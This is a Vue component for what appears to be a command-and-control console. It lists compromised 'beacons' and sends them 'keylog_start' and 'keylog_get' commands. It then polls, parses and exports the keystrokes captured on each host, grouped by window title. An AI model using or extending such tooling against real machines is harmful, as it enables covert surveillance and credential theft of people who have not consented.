<template>
  <div class="global-keystrokes cs-font-ui">
    <!-- Toolbar -->
    <div class="gk-toolbar">
      <div class="gk-title-group">
        <span class="gk-title">{{ isZh ? '键盘记录与系统活动' : 'Keystrokes & System Activity' }}</span>
        <span class="gk-count">{{ isZh ? `共 ${logBlocks.length} 条记录` : `${logBlocks.length} records` }}</span>
      </div>
      <div class="gk-spacer" />
      <span class="gk-beacon-label">{{ isZh ? '活动会话' : 'Active Session' }}: <b>{{ selectedClient?.Computer || selectedClient?.Uid?.slice(0, 8) || (isZh ? '无' : 'None') }}</b></span>
      <button class="gk-btn-icon" :title="isZh ? '刷新键盘记录' : 'Refresh Keystrokes'" @click="fetchLogs">
        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
          <polyline points="23 4 23 10 17 10" />
          <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" />
        </svg>
      </button>
    </div>

    <!-- Master-Detail Split Workspace -->
    <div class="gk-workspace">
      <!-- Left: Beacons List -->
      <div class="gk-sidebar">
        <div class="sidebar-header">{{ isZh ? '会话列表' : 'Beacons' }}</div>
        <div class="beacon-list">
          <div
            v-for="c in clients"
            :key="c.Uid"
            class="beacon-item"
            :class="{ active: selectedUid === c.Uid }"
            @click="selectBeacon(c.Uid)"
          >
            <span class="beacon-dot" :class="{ online: c.Online === '1' }" />
            <div class="beacon-info">
              <div class="beacon-name">{{ c.Computer || c.Uid.slice(0, 8) }}</div>
              <div class="beacon-sub">{{ c.Username || 'user' }} ({{ c.ExternalIP || c.InternalIP || '-' }})</div>
            </div>
          </div>

          <div v-if="!clients.length" class="sidebar-empty">
            {{ isZh ? '暂无会话' : 'No Beacons' }}
          </div>
        </div>
      </div>

      <!-- Right: Keystrokes Log Stream -->
      <div class="gk-content">
        <div class="content-toolbar">
          <span class="content-title">{{ isZh ? '窗口事件与键盘记录' : 'Logged Window Events & Keystrokes' }}</span>
          <div class="gk-spacer" />
          <el-input
            v-model="filterKeyword"
            :placeholder="isZh ? '过滤日志文本...' : 'Filter logged text...'"
            size="small"
            clearable
            style="width: 180px; margin-right: 8px"
          />
          <button class="cs-btn cs-btn-xs" @click="copyAll">{{ isZh ? '复制' : 'Copy' }}</button>
          <button class="cs-btn cs-btn-xs" @click="clearLog">{{ isZh ? '清空' : 'Clear' }}</button>
        </div>

        <div ref="logEl" class="log-stream cs-font-mono">
          <template v-if="filteredBlocks.length">
            <div v-for="(block, idx) in filteredBlocks" :key="idx" class="log-block">
              <div class="block-header">
                <span class="block-time">[{{ block.time }}]</span>
                <span class="block-window">{{ isZh ? '标题' : 'Title' }}: {{ block.windowTitle }}</span>
              </div>
              <div class="block-text" v-html="formatKeystrokesHtml(block.keystrokes)" />
            </div>
          </template>
          <EmptyState
            v-else
            class="log-empty"
            icon="⌨️"
            variant="inline"
            :title="isZh ? '暂无键盘记录' : 'No Keystrokes Recorded'"
            :desc="isZh ? '键盘记录或监控模块捕获的击键将显示在此处。' : 'Keystrokes captured by keylogger or monitor module will appear here.'"
          />
        </div>
      </div>
    </div>

    <!-- Bottom Action Bar (CS Native Button Row) -->
    <div class="gk-bottom-bar">
      <button class="cs-btn cs-btn-primary" :disabled="!selectedUid" @click="startKeylogger">
        {{ t('btn.start_keylog') }}
      </button>
      <button class="cs-btn" :disabled="!selectedUid" @click="pullKeylogs">
        {{ t('btn.get_keylog') }}
      </button>
      <button class="cs-btn" :disabled="!logBlocks.length" @click="copyAll">
        {{ t('btn.copy_all') }}
      </button>
      <button class="cs-btn cs-btn-danger" :disabled="!logBlocks.length" @click="clearLog">
        {{ isZh ? '清空' : 'Clear' }}
      </button>
      <button class="cs-btn" :disabled="!logBlocks.length" @click="exportLog">
        {{ t('btn.export') }}
      </button>

      <div class="gk-bottom-spacer" />

      <button class="cs-btn" @click="showHelp">
        {{ t('btn.help') }}
      </button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, onMounted, ref } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { useClientsStore } from '@/stores/clients'
import { useWorkspaceStore } from '@/stores/workspace'
import { useI18nStore } from '@/stores/i18n'
import { useTabActive, useVisibilityInterval } from '@/utils/useVisibilityInterval'
import EmptyState from '@/components/Common/EmptyState.vue'
import ClientAPI from '@/api/clients'

interface KeyBlock {
  time: string
  windowTitle: string
  keystrokes: string
}

const clientsStore = useClientsStore()
const workspace = useWorkspaceStore()
const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)
const t = (k: string, d?: string) => i18nStore.t(k, d)

const selectedUid = ref('')
const filterKeyword = ref('')
const logBlocks = ref<KeyBlock[]>([])
const logEl = ref<HTMLElement | null>(null)

const clients = computed(() => clientsStore.clientsList)
const selectedClient = computed(() => clientsStore.getClientByUid(selectedUid.value))

const filteredBlocks = computed(() => {
  if (!filterKeyword.value.trim()) return logBlocks.value
  const q = filterKeyword.value.toLowerCase().trim()
  return logBlocks.value.filter(
    (b) => b.windowTitle.toLowerCase().includes(q) || b.keystrokes.toLowerCase().includes(q),
  )
})

function selectBeacon(uid: string) {
  selectedUid.value = uid
  fetchLogs()
}

async function fetchLogs() {
  if (!selectedUid.value) return
  try {
    const res = await ClientAPI.get_shellcontent({ uid: selectedUid.value })
    const raw: string = res.data?.data || ''
    if (raw.includes('[keylog]') || raw.includes('Title:')) {
      parseKeystrokes(raw)
    }
    // 无 [keylog] 数据时保持空态（不再注入假 demo 块）
  } catch {}
}

function formatKeystrokesHtml(raw: string): string {
  if (!raw) return ''
  const escaped = raw
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
  return escaped.replace(/(\[|\&lt;)([A-Z0-9_\-\+\s]{2,16})(\]|\&gt;)/gi, (_m, _p1, key) => {
    return `<span class="key-cap">${key.toUpperCase()}</span>`
  })
}

function parseKeystrokes(raw: string) {
  const blocks: KeyBlock[] = []
  const lines = raw.split('\n')
  let curWindow = 'Active Desktop Window'
  let curText = ''

  for (const line of lines) {
    if (line.includes('Title:')) {
      if (curText) {
        blocks.push({ time: new Date().toLocaleTimeString(), windowTitle: curWindow, keystrokes: curText })
        curText = ''
      }
      curWindow = line.split('Title:')[1]?.trim() || 'Window'
    } else {
      curText += line + '\n'
    }
  }
  if (curText) {
    blocks.push({ time: new Date().toLocaleTimeString(), windowTitle: curWindow, keystrokes: curText })
  }
  logBlocks.value = blocks
}

async function startKeylogger() {
  if (!selectedUid.value) return
  try {
    // 命令表只有 keylog_start/get/stop（sendCommand.go:104），"keylogger" 会落默认 SHELL 分支
    await ClientAPI.send_commands({ uid: selectedUid.value, command: 'keylog_start' })
    ElMessage.success(isZh.value ? '已下发键盘记录指令，结果回显到会话控制台' : 'Keylogger task sent; results echo to the session console')
    setTimeout(fetchLogs, 1500)
  } catch {
    ElMessage.error(isZh.value ? '下发键盘记录指令失败' : 'Failed to send keylogger command')
  }
}

// 下发 keylog_get 主动拉取已记录按键（记录写入会话 shell 输出，随后刷新解析）
async function pullKeylogs() {
  if (!selectedUid.value) return
  try {
    await ClientAPI.send_commands({ uid: selectedUid.value, command: 'keylog_get' })
    ElMessage.success(isZh.value ? '已下发拉取指令，正在同步记录...' : 'Pull request sent, syncing...')
    setTimeout(fetchLogs, 1200)
  } catch {
    ElMessage.error(isZh.value ? '下发拉取指令失败' : 'Failed to send pull command')
  }
}

function copyAll() {
  const text = logBlocks.value.map((b) => `[${b.time}] Title: ${b.windowTitle}\n${b.keystrokes}`).join('\n\n')
  if (!text) return
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success('Copied keystrokes to clipboard')
  })
}

function clearLog() {
  ElMessageBox.confirm(
    isZh.value
      ? '确定清空当前键盘记录吗？键盘记录是取证数据，清空后不可恢复。'
      : 'Clear all captured keystrokes? This forensic data cannot be recovered.',
    isZh.value ? '清空确认' : 'Confirm Clear',
    {
      confirmButtonText: isZh.value ? '清空' : 'Clear',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
      type: 'warning',
    },
  )
    .then(() => {
      logBlocks.value = []
      ElMessage.success(isZh.value ? '键盘记录已清空' : 'Keystrokes log cleared')
    })
    .catch(() => {})
}

function exportLog() {
  const text = logBlocks.value.map((b) => `[${b.time}] Title: ${b.windowTitle}\n${b.keystrokes}`).join('\n\n')
  const blob = new Blob([text], { type: 'text/plain' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = `keystrokes_${selectedUid.value.slice(0, 8)}_${Date.now()}.txt`
  a.click()
  URL.revokeObjectURL(url)
  ElMessage.success('Keystrokes exported')
}

function showHelp() {
  workspace.openDialog('about')
}

// 【性能】8s 轮询键盘记录，接入可见性治理(非活动标签/页面隐藏时暂停)
const tabActive = useTabActive()
useVisibilityInterval(fetchLogs, 8000, { isActive: () => tabActive.value })

onMounted(() => {
  if (workspace.primarySelectedUid) {
    selectedUid.value = workspace.primarySelectedUid
  } else if (clientsStore.clientsList.length) {
    selectedUid.value = clientsStore.clientsList[0].Uid
  }
  if (selectedUid.value) fetchLogs()
})
</script>

<style scoped>
.global-keystrokes {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-panel);
  overflow: hidden;
  position: relative;
}

/* Toolbar */
.gk-toolbar {
  display: flex;
  align-items: center;
  gap: 8px;
  height: 28px;
  padding: 0 8px;
  background: var(--cs-titlebar-bg);
  border-bottom: 1px solid var(--cs-border);
  flex-shrink: 0;
}
.gk-title-group {
  display: flex;
  align-items: center;
  gap: 6px;
}
.gk-title {
  font-size: 16px;
  font-weight: 600;
  color: var(--cs-text-dim);
  text-transform: uppercase;
  letter-spacing: .04em;
}
.gk-count {
  font-size: 11px;
  color: var(--cs-text-dim);
}
.gk-beacon-label {
  font-size: 11px;
  color: var(--cs-text-dim);
}
.gk-beacon-label b {
  color: var(--cs-text-bright);
}
.gk-spacer { flex: 1; }

.gk-btn-icon {
  background: transparent;
  border: 1px solid var(--cs-border);
  border-radius: 2px;
  color: var(--cs-text);
  width: 22px;
  height: 22px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}
.gk-btn-icon:hover {
  background: var(--cs-hover);
  color: var(--cs-text-bright);
}

/* Master-Detail */
.gk-workspace {
  flex: 1;
  min-height: 0;
  display: flex;
  overflow: hidden;
}

/* Left Sidebar */
.gk-sidebar {
  width: 200px;
  border-right: 1px solid var(--cs-border);
  background: var(--cs-titlebar-bg);
  display: flex;
  flex-direction: column;
  flex-shrink: 0;
}
.sidebar-header {
  padding: 6px 8px;
  font-size: 11px;
  font-weight: 600;
  color: var(--cs-text-dim);
  text-transform: uppercase;
  border-bottom: 1px solid var(--cs-border);
}
.beacon-list {
  flex: 1;
  overflow-y: auto;
}
.beacon-item {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 6px 8px;
  border-bottom: 1px solid var(--cs-border);
  cursor: pointer;
  transition: background 100ms ease;
}
.beacon-item:hover {
  background: var(--cs-hover);
}
.beacon-item.active {
  background: var(--cs-panel);
  border-left: 3px solid var(--cs-active);
}
.beacon-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: var(--cs-offline);
}
.beacon-dot.online {
  background: var(--cs-online);
}
.beacon-info {
  flex: 1;
  overflow: hidden;
}
.beacon-name {
  font-size: 11px;
  font-weight: 600;
  color: var(--cs-text-bright);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.beacon-sub {
  font-size: 10px;
  color: var(--cs-text-dim);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.sidebar-empty {
  padding: 20px;
  text-align: center;
  font-size: 11px;
  color: var(--cs-text-dim);
}

/* Right Content */
.gk-content {
  flex: 1;
  min-width: 0;
  display: flex;
  flex-direction: column;
  background: var(--cs-panel);
}
.content-toolbar {
  height: 28px;
  padding: 0 8px;
  background: var(--cs-titlebar-bg);
  border-bottom: 1px solid var(--cs-border);
  display: flex;
  align-items: center;
  gap: 6px;
}
.content-title {
  font-size: 11px;
  font-weight: 600;
  color: var(--cs-text-dim);
}
.log-stream {
  flex: 1;
  overflow-y: auto;
  padding: 8px 12px;
  background: var(--cs-console);
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.log-block {
  background: var(--cs-panel);
  border: 1px solid var(--cs-border);
  border-radius: 2px;
  overflow: hidden;
}
.block-header {
  padding: 4px 8px;
  background: var(--cs-titlebar-bg);
  border-bottom: 1px solid var(--cs-border);
  display: flex;
  gap: 8px;
  font-size: 11px;
}
.block-time {
  color: var(--cs-text-dim);
}
.block-window {
  color: var(--cs-active);
  font-weight: 600;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.block-text {
  padding: 8px;
  font-size: 12px;
  color: var(--cs-text);
  white-space: pre-wrap;
  word-break: break-all;
  line-height: 1.6;
}

:deep(.key-cap) {
  display: inline-block;
  padding: 1px 5px;
  margin: 0 2px;
  font-size: 11px;
  font-family: var(--cs-font-mono);
  font-weight: 600;
  background: var(--cs-hover);
  border: 1px solid var(--cs-border);
  border-bottom: 2px solid var(--cs-border);
  border-radius: 3px;
  color: var(--cs-active);
  line-height: 1.2;
}

.log-empty {
  margin: auto;
}

/* Bottom Action Bar */
.gk-bottom-bar {
  display: flex;
  align-items: center;
  gap: 6px;
  height: 32px;
  padding: 0 8px;
  background: var(--cs-titlebar-bg);
  border-top: 1px solid var(--cs-border);
  flex-shrink: 0;
}
.gk-bottom-spacer { flex: 1; }
</style>
